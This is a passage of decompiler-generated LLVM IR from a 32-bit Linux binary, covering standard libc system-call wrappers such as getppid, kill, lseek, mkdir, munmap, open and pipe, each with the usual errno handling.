  br i1 %tmp, label %dec_label_pc_805b658, label %dec_label_pc_805b64c

dec_label_pc_805b64c:                             ; preds = %entry
  %v0_805b64c = load i32, i32* %stack_var_-4, align 4
  %v1_805b64c = call i32 @__errno_location(i32 %v0_805b64c)
  %v0_805b651 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b651 = sub i32 0, %v0_805b651
  %v2_805b653 = inttoptr i32 %v1_805b64c to i32*
  store i32 %v1_805b651, i32* %v2_805b653, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b658

dec_label_pc_805b658:                             ; preds = %entry, %dec_label_pc_805b64c
  %v0_805b659 = phi i32 [ %v1_805b641, %entry ], [ -1, %dec_label_pc_805b64c ]
  %v2_805b65c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b65c, i32* @ebx, align 4
  ret i32 %v0_805b659

; uselistorder directives
  uselistorder i32 %v1_805b641, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b658, { 1, 0 }
}

define i32 @getppid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b660 = load i32, i32* @ebx, align 4
  store i32 %v0_805b660, i32* %stack_var_-4, align 4
  %v1_805b669 = call i32 @getppid(i32 %v0_805b660)
  store i32 %v1_805b669, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b669, -4095
  br i1 %tmp, label %dec_label_pc_805b680, label %dec_label_pc_805b674

dec_label_pc_805b674:                             ; preds = %entry
  %v0_805b674 = load i32, i32* %stack_var_-4, align 4
  %v1_805b674 = call i32 @__errno_location(i32 %v0_805b674)
  %v0_805b679 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b679 = sub i32 0, %v0_805b679
  %v2_805b67b = inttoptr i32 %v1_805b674 to i32*
  store i32 %v1_805b679, i32* %v2_805b67b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b680

dec_label_pc_805b680:                             ; preds = %entry, %dec_label_pc_805b674
  %v0_805b681 = phi i32 [ %v1_805b669, %entry ], [ -1, %dec_label_pc_805b674 ]
  %v2_805b684 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b684, i32* @ebx, align 4
  ret i32 %v0_805b681

; uselistorder directives
  uselistorder i32 %v1_805b669, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @getppid, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805b680, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b688 = load i32, i32* @ebx, align 4
  store i32 %v0_805b688, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_805b69b = call i32 @int80_syscall(i32 191)
  store i32 %v1_805b69b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b69b, -4095
  br i1 %tmp, label %dec_label_pc_805b6b4, label %dec_label_pc_805b6a8

dec_label_pc_805b6a8:                             ; preds = %entry
  %v0_805b6a8 = load i32, i32* %stack_var_-4, align 4
  %v1_805b6a8 = call i32 @__errno_location(i32 %v0_805b6a8)
  %v0_805b6ad = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b6ad = sub i32 0, %v0_805b6ad
  %v2_805b6af = inttoptr i32 %v1_805b6a8 to i32*
  store i32 %v1_805b6ad, i32* %v2_805b6af, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b6b4

dec_label_pc_805b6b4:                             ; preds = %entry, %dec_label_pc_805b6a8
  %v0_805b6b5 = phi i32 [ %v1_805b69b, %entry ], [ -1, %dec_label_pc_805b6a8 ]
  %v2_805b6b8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b6b8, i32* @ebx, align 4
  ret i32 %v0_805b6b5

; uselistorder directives
  uselistorder i32 %v1_805b69b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b6b4, { 1, 0 }
}

define i32 @gettimeofday(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b6bc = load i32, i32* @ebx, align 4
  store i32 %v0_805b6bc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805b6cf = call i32 @gettimeofday(i32 %v0_805b6bc, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805b6cf, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805b6cf, -4095
  br i1 %tmp, label %dec_label_pc_805b6e8, label %dec_label_pc_805b6dc

dec_label_pc_805b6dc:                             ; preds = %entry
  %v0_805b6dc = load i32, i32* %stack_var_-4, align 4
  %v1_805b6dc = call i32 @__errno_location(i32 %v0_805b6dc)
  %v0_805b6e1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b6e1 = sub i32 0, %v0_805b6e1
  %v2_805b6e3 = inttoptr i32 %v1_805b6dc to i32*
  store i32 %v1_805b6e1, i32* %v2_805b6e3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b6e8

dec_label_pc_805b6e8:                             ; preds = %entry, %dec_label_pc_805b6dc
  %v0_805b6e9 = phi i32 [ %v4_805b6cf, %entry ], [ -1, %dec_label_pc_805b6dc ]
  %v2_805b6ec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b6ec, i32* @ebx, align 4
  ret i32 %v0_805b6e9

; uselistorder directives
  uselistorder i32 %v4_805b6cf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b6e8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b6f0 = load i32, i32* @edi, align 4
  store i32 %v0_805b6f0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805b708 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_805b710 = call i32 @ioctl(i32 %v0_805b708, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805b708, i32* @ebx, align 4
  store i32 %v3_805b710, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b710, -4095
  br i1 %tmp, label %dec_label_pc_805b728, label %dec_label_pc_805b71c

dec_label_pc_805b71c:                             ; preds = %entry
  %v1_805b71c = call i32 @__errno_location(i32 %v0_805b708)
  %v0_805b721 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b721 = sub i32 0, %v0_805b721
  %v2_805b723 = inttoptr i32 %v1_805b71c to i32*
  store i32 %v1_805b721, i32* %v2_805b723, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b728

dec_label_pc_805b728:                             ; preds = %entry, %dec_label_pc_805b71c
  %v0_805b72b = phi i32 [ %v3_805b710, %entry ], [ -1, %dec_label_pc_805b71c ]
  %v2_805b72d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b72d, i32* @edi, align 4
  ret i32 %v0_805b72b

; uselistorder directives
  uselistorder i32 %v3_805b710, { 1, 0, 2 }
  uselistorder i32 %v0_805b708, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b728, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b730 = load i32, i32* @ebx, align 4
  store i32 %v0_805b730, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805b743 = call i32 @kill(i32 %v0_805b730, i32 %tmp4)
  store i32 %v2_805b743, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805b743, -4095
  br i1 %tmp, label %dec_label_pc_805b75c, label %dec_label_pc_805b750

dec_label_pc_805b750:                             ; preds = %entry
  %v0_805b750 = load i32, i32* %stack_var_-4, align 4
  %v1_805b750 = call i32 @__errno_location(i32 %v0_805b750)
  %v0_805b755 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b755 = sub i32 0, %v0_805b755
  %v2_805b757 = inttoptr i32 %v1_805b750 to i32*
  store i32 %v1_805b755, i32* %v2_805b757, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b75c

dec_label_pc_805b75c:                             ; preds = %entry, %dec_label_pc_805b750
  %v0_805b75d = phi i32 [ %v2_805b743, %entry ], [ -1, %dec_label_pc_805b750 ]
  %v2_805b75c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b75c, i32* @edx, align 4
  %v2_805b760 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b760, i32* @ebx, align 4
  ret i32 %v0_805b75d

; uselistorder directives
  uselistorder i32 %v2_805b743, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @kill, { 9, 7, 0, 1, 8, 6, 5, 4, 2, 3 }
  uselistorder label %dec_label_pc_805b75c, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805b766 = load i32, i32* @ebx, align 4
  store i32 %v0_805b766, i32* %stack_var_-12, align 4
  %v2_805b76e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805b76e, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v1_805b788 = call i32 @int80_syscall(i32 140)
  store i32 %v1_805b788, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_805b788, -4095
  br i1 %tmp16, label %dec_label_pc_805b7a2, label %dec_label_pc_805b794

dec_label_pc_805b794:                             ; preds = %entry
  %v1_805b794 = call i32 @__errno_location(i32 %arg3)
  %v0_805b799 = load i32, i32* %esi.global-to-local, align 4
  %v1_805b799 = sub i32 0, %v0_805b799
  %v2_805b79b = inttoptr i32 %v1_805b794 to i32*
  store i32 %v1_805b799, i32* %v2_805b79b, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b7a6

dec_label_pc_805b7a2:                             ; preds = %entry
  %v1_805b7a2 = icmp eq i32 %v1_805b788, 0
  br i1 %v1_805b7a2, label %dec_label_pc_805b7ab, label %dec_label_pc_805b7a6

dec_label_pc_805b7a6:                             ; preds = %dec_label_pc_805b7a2, %dec_label_pc_805b794
  %v0_805b7a6 = phi i32 [ %v1_805b788, %dec_label_pc_805b7a2 ], [ -1, %dec_label_pc_805b794 ]
  %v1_805b7a8 = ashr i32 %v0_805b7a6, 31
  br label %dec_label_pc_805b7b3

dec_label_pc_805b7ab:                             ; preds = %dec_label_pc_805b7a2
  %v3_805b7ab = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_805b7b3

dec_label_pc_805b7b3:                             ; preds = %dec_label_pc_805b7a6, %dec_label_pc_805b7ab
  %v0_805b7b9 = phi i32 [ %v0_805b7a6, %dec_label_pc_805b7a6 ], [ %v3_805b7ab, %dec_label_pc_805b7ab ]
  %storemerge = phi i32 [ %v1_805b7a8, %dec_label_pc_805b7a6 ], [ %tmp, %dec_label_pc_805b7ab ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_805b7b6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b7b6, i32* @ebx, align 4
  ret i32 %v0_805b7b9

; uselistorder directives
  uselistorder i32 %v1_805b788, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805b7b3, { 1, 0 }
}

define i32 @_longjmp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg2, i32* @ebx, align 4
  %v1_805b7c9 = add i32 %arg1, 24
  %v2_805b7c9 = inttoptr i32 %v1_805b7c9 to i32*
  %v3_805b7c9 = load i32, i32* %v2_805b7c9, align 4
  %v4_805b7c9 = icmp eq i32 %v3_805b7c9, 0
  br i1 %v4_805b7c9, label %entry.dec_label_pc_805b7e0_crit_edge, label %dec_label_pc_805b7cf

entry.dec_label_pc_805b7e0_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805b7e0

dec_label_pc_805b7cf:                             ; preds = %entry
  %v1_805b7d2 = add i32 %arg1, 28
  %v3_805b7d8 = inttoptr i32 %v1_805b7d2 to %_TYPEDEF_sigset_t*
  %v4_805b7d8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805b7d8, i32 0)
  %v0_805b7ed.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805b7e0

dec_label_pc_805b7e0:                             ; preds = %entry.dec_label_pc_805b7e0_crit_edge, %dec_label_pc_805b7cf
  %v0_805b7ed = phi i32 [ %arg1, %entry.dec_label_pc_805b7e0_crit_edge ], [ %v0_805b7ed.pre, %dec_label_pc_805b7cf ]
  %v1_805b7e5 = icmp eq i32 %arg2, 0
  %v3_805b7e7 = select i1 %v1_805b7e5, i32 1, i32 %arg2
  %v4_805b7ee = inttoptr i32 %v0_805b7ed to i32*
  %v5_805b7ee = call i32 @__longjmp(i32* %v4_805b7ee, i32 %v3_805b7e7, i32 1, i32 1)
  ret i32 %v5_805b7ee

; uselistorder directives
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_805b7e0, { 1, 0 }
}

define i32 @__GI___libc_lseek(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b7f4 = load i32, i32* @edi, align 4
  store i32 %v0_805b7f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805b804 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805b80c = call i32 @lseek(i32 %v0_805b804)
  store i32 %v0_805b804, i32* @ebx, align 4
  store i32 %v1_805b80c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b80c, -4095
  br i1 %tmp, label %dec_label_pc_805b824, label %dec_label_pc_805b818

dec_label_pc_805b818:                             ; preds = %entry
  %v1_805b818 = call i32 @__errno_location(i32 %v0_805b804)
  %v0_805b81d = load i32, i32* %edi.global-to-local, align 4
  %v1_805b81d = sub i32 0, %v0_805b81d
  %v2_805b81f = inttoptr i32 %v1_805b818 to i32*
  store i32 %v1_805b81d, i32* %v2_805b81f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b824

dec_label_pc_805b824:                             ; preds = %entry, %dec_label_pc_805b818
  %v0_805b825 = phi i32 [ %v1_805b80c, %entry ], [ -1, %dec_label_pc_805b818 ]
  %v2_805b828 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b828, i32* @edi, align 4
  ret i32 %v0_805b825

; uselistorder directives
  uselistorder i32 %v1_805b80c, { 1, 0, 2 }
  uselistorder i32 %v0_805b804, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b824, { 1, 0 }
}

define i32 @mkdir(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b82c = load i32, i32* @ebx, align 4
  store i32 %v0_805b82c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805b840 = trunc i32 %tmp4 to i16
  %v3_805b840 = call i32 @mkdir(i32 %v0_805b82c, i16 %v2_805b840)
  store i32 %v3_805b840, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b840, -4095
  br i1 %tmp, label %dec_label_pc_805b859, label %dec_label_pc_805b84d

dec_label_pc_805b84d:                             ; preds = %entry
  %v0_805b84d = load i32, i32* %stack_var_-4, align 4
  %v1_805b84d = call i32 @__errno_location(i32 %v0_805b84d)
  %v0_805b852 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b852 = sub i32 0, %v0_805b852
  %v2_805b854 = inttoptr i32 %v1_805b84d to i32*
  store i32 %v1_805b852, i32* %v2_805b854, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b859

dec_label_pc_805b859:                             ; preds = %entry, %dec_label_pc_805b84d
  %v0_805b85a = phi i32 [ %v3_805b840, %entry ], [ -1, %dec_label_pc_805b84d ]
  %v2_805b85d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b85d, i32* @ebx, align 4
  ret i32 %v0_805b85a

; uselistorder directives
  uselistorder i32 %v3_805b840, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b859, { 1, 0 }
}

define i32 @__libc_msync(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b860 = load i32, i32* @edi, align 4
  store i32 %v0_805b860, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805b870 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805b878 = call i32 @msync(i32 %v0_805b870)
  store i32 %v1_805b878, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b878, -4095
  br i1 %tmp, label %dec_label_pc_805b890, label %dec_label_pc_805b884

dec_label_pc_805b884:                             ; preds = %entry
  %v1_805b884 = call i32 @__errno_location(i32 %v0_805b870)
  %v0_805b889 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b889 = sub i32 0, %v0_805b889
  %v2_805b88b = inttoptr i32 %v1_805b884 to i32*
  store i32 %v1_805b889, i32* %v2_805b88b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b890

dec_label_pc_805b890:                             ; preds = %entry, %dec_label_pc_805b884
  %v0_805b891 = phi i32 [ %v1_805b878, %entry ], [ -1, %dec_label_pc_805b884 ]
  %v2_805b894 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b894, i32* @edi, align 4
  ret i32 %v0_805b891

; uselistorder directives
  uselistorder i32 %v1_805b878, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b890, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b898 = load i32, i32* @ebx, align 4
  store i32 %v0_805b898, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_805b8ab = call i32 @munmap(i32 %v0_805b898, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_805b8ab, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_805b8ab, -4095
  br i1 %tmp, label %dec_label_pc_805b8c4, label %dec_label_pc_805b8b8

dec_label_pc_805b8b8:                             ; preds = %entry
  %v0_805b8b8 = load i32, i32* %stack_var_-4, align 4
  %v1_805b8b8 = call i32 @__errno_location(i32 %v0_805b8b8)
  %v0_805b8bd = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b8bd = sub i32 0, %v0_805b8bd
  %v2_805b8bf = inttoptr i32 %v1_805b8b8 to i32*
  store i32 %v1_805b8bd, i32* %v2_805b8bf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b8c4

dec_label_pc_805b8c4:                             ; preds = %entry, %dec_label_pc_805b8b8
  %v0_805b8c5 = phi i32 [ %v4_805b8ab, %entry ], [ -1, %dec_label_pc_805b8b8 ]
  %v2_805b8c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b8c4, i32* @edx, align 4
  %v2_805b8c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b8c8, i32* @ebx, align 4
  ret i32 %v0_805b8c5

; uselistorder directives
  uselistorder i32 %v4_805b8ab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b8c4, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805b8cc = load i32, i32* @ebx, align 4
  store i32 %v0_805b8cc, i32* %stack_var_-4, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805b8df = call i32 @nanosleep(i32 %v0_805b8cc, i32 %tmp4)
  store i32 %v2_805b8df, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805b8df, -4095
  br i1 %tmp, label %dec_label_pc_805b8f8, label %dec_label_pc_805b8ec

dec_label_pc_805b8ec:                             ; preds = %entry
  %v0_805b8ec = load i32, i32* %stack_var_-4, align 4
  %v1_805b8ec = call i32 @__errno_location(i32 %v0_805b8ec)
  %v0_805b8f1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b8f1 = sub i32 0, %v0_805b8f1
  %v2_805b8f3 = inttoptr i32 %v1_805b8ec to i32*
  store i32 %v1_805b8f1, i32* %v2_805b8f3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b8f8

dec_label_pc_805b8f8:                             ; preds = %entry, %dec_label_pc_805b8ec
  %v0_805b8f9 = phi i32 [ %v2_805b8df, %entry ], [ -1, %dec_label_pc_805b8ec ]
  %v2_805b8fc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b8fc, i32* @ebx, align 4
  ret i32 %v0_805b8f9

; uselistorder directives
  uselistorder i32 %v2_805b8df, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b8f8, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_805b900 = load i32, i32* @edi, align 4
  %v0_805b903 = load i32, i32* @ebx, align 4
  %v4_805b907 = sext i8 %arg2 to i32
  store i32 %v4_805b907, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_805b90f = and i8 %arg2, 64
  %v3_805b90f = icmp eq i8 %v2_805b90f, 0
  br i1 %v3_805b90f, label %dec_label_pc_805b920, label %dec_label_pc_805b914

dec_label_pc_805b914:                             ; preds = %entry
  br label %dec_label_pc_805b920

dec_label_pc_805b920:                             ; preds = %entry, %dec_label_pc_805b914
  store i32 %arg1, i32* @ebx, align 4
  %v1_805b92b = call i32 @open(i32 %v0_805b903)
  store i32 %v1_805b92b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b92b, -4095
  br i1 %tmp, label %dec_label_pc_805b943, label %dec_label_pc_805b937

dec_label_pc_805b937:                             ; preds = %dec_label_pc_805b920
  %v1_805b937 = call i32 @__errno_location(i32 %v0_805b903)
  %v0_805b93c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b93c = sub i32 0, %v0_805b93c
  %v2_805b93e = inttoptr i32 %v1_805b937 to i32*
  store i32 %v1_805b93c, i32* %v2_805b93e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b943

dec_label_pc_805b943:                             ; preds = %dec_label_pc_805b920, %dec_label_pc_805b937
  %v0_805b946 = phi i32 [ %v1_805b92b, %dec_label_pc_805b920 ], [ -1, %dec_label_pc_805b937 ]
  store i32 %v0_805b903, i32* @ebx, align 4
  store i32 %v0_805b900, i32* @edi, align 4
  ret i32 %v0_805b946

; uselistorder directives
  uselistorder i32 %v1_805b92b, { 1, 0, 2 }
  uselistorder i32 %v0_805b903, { 1, 0, 2 }
  uselistorder i8 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805b943, { 1, 0 }
  uselistorder label %dec_label_pc_805b920, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_805b95b = call i32 @__libc_open(i32 %arg1, i8 65, i32 %arg2)
  ret i32 %v4_805b95b

; uselistorder directives
  uselistorder i8 65, { 1, 0 }
}

define i32 @__GI___libc_open64(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_805b96d = and i8 %arg2, 64
  %v3_805b96d = icmp eq i8 %v2_805b96d, 0
  br i1 %v3_805b96d, label %dec_label_pc_805b97e, label %dec_label_pc_805b972

dec_label_pc_805b972:                             ; preds = %entry
  br label %dec_label_pc_805b97e

dec_label_pc_805b97e:                             ; preds = %entry, %dec_label_pc_805b972
  %v0_805b982 = phi i32 [ 0, %entry ], [ %arg3, %dec_label_pc_805b972 ]
  %v4_805b988 = call i32 @__libc_open(i32 %arg1, i8 %arg2, i32 %v0_805b982)
  ret i32 %v4_805b988

; uselistorder directives
  uselistorder label %dec_label_pc_805b97e, { 1, 0 }
}

define i32 @__libc_pause() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b994 = load i32, i32* @ebx, align 4
  store i32 %v0_805b994, i32* %stack_var_-4, align 4
  %v1_805b99d = call i32 @pause(i32 %v0_805b994)
  store i32 %v1_805b99d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b99d, -4095
  br i1 %tmp, label %dec_label_pc_805b9b4, label %dec_label_pc_805b9a8

dec_label_pc_805b9a8:                             ; preds = %entry
  %v0_805b9a8 = load i32, i32* %stack_var_-4, align 4
  %v1_805b9a8 = call i32 @__errno_location(i32 %v0_805b9a8)
  %v0_805b9ad = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b9ad = sub i32 0, %v0_805b9ad
  %v2_805b9af = inttoptr i32 %v1_805b9a8 to i32*
  store i32 %v1_805b9ad, i32* %v2_805b9af, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b9b4

dec_label_pc_805b9b4:                             ; preds = %entry, %dec_label_pc_805b9a8
  %v0_805b9b5 = phi i32 [ %v1_805b99d, %entry ], [ -1, %dec_label_pc_805b9a8 ]
  %v2_805b9b8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b9b8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_805b9b5

; uselistorder directives
  uselistorder i32 %v1_805b99d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b9b4, { 1, 0 }
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b9bc = load i32, i32* @edi, align 4
  store i32 %v0_805b9bc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_805b9c4 = load i32, i32* @ebx, align 4
  %v1_805b9cc = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_805b9cc = call i32 @pipe([2 x i32] %v1_805b9cc)
  store i32 %v0_805b9c4, i32* @ebx, align 4
  store i32 %v2_805b9cc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_805b9cc, -4095
  br i1 %tmp, label %dec_label_pc_805b9e4, label %dec_label_pc_805b9d8

dec_label_pc_805b9d8:                             ; preds = %entry
  %v1_805b9d8 = call i32 @__errno_location(i32 %v0_805b9c4)
  %v0_805b9dd = load i32, i32* %edi.global-to-local, align 4
  %v1_805b9dd = sub i32 0, %v0_805b9dd
  %v2_805b9df = inttoptr i32 %v1_805b9d8 to i32*
  store i32 %v1_805b9dd, i32* %v2_805b9df, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b9e4

dec_label_pc_805b9e4:                             ; preds = %entry, %dec_label_pc_805b9d8
  %v0_805b9e5 = phi i32 [ %v2_805b9cc, %entry ], [ -1, %dec_label_pc_805b9d8 ]
  %v2_805b9e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b9e4, i32* @edx, align 4
  %v2_805b9e8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b9e8, i32* @edi, align 4
  ret i32 %v0_805b9e5

; uselistorder directives
  uselistorder i32 %v2_805b9cc, { 1, 0, 2 }
  uselistorder i32 %v0_805b9c4, { 1, 0 }
